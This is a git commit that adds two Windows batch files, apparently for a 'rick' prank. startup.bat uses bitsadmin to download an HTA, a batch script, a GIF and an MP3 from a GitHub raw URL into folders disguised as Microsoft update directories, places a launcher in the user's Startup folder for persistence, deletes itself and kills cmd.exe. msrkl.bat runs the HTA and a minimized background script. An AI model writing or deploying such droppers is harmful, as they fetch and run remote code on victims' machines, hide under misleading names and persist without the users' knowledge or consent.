84144dfba96a96d55e2b89ab179919d791631d5d
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 22:12:23 +0800

    Add files via upload

---
+++ Online/msrkl.bat
@@ -0,0 +1,4 @@
+@echo off
+
+start %AppData%\Microsoft\Update\msrkl.hta
+start /min %AppData%\Microsoft\Update\msrklbg.bat
---
+++ Online/startup.bat
@@ -0,0 +1,14 @@
+@echo off
+
+cls
+
+mkdir "%AppData%\Microsoft\Update\User\Services"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
+
+del startup.bat
+
+taskkill /f /im cmd.exe
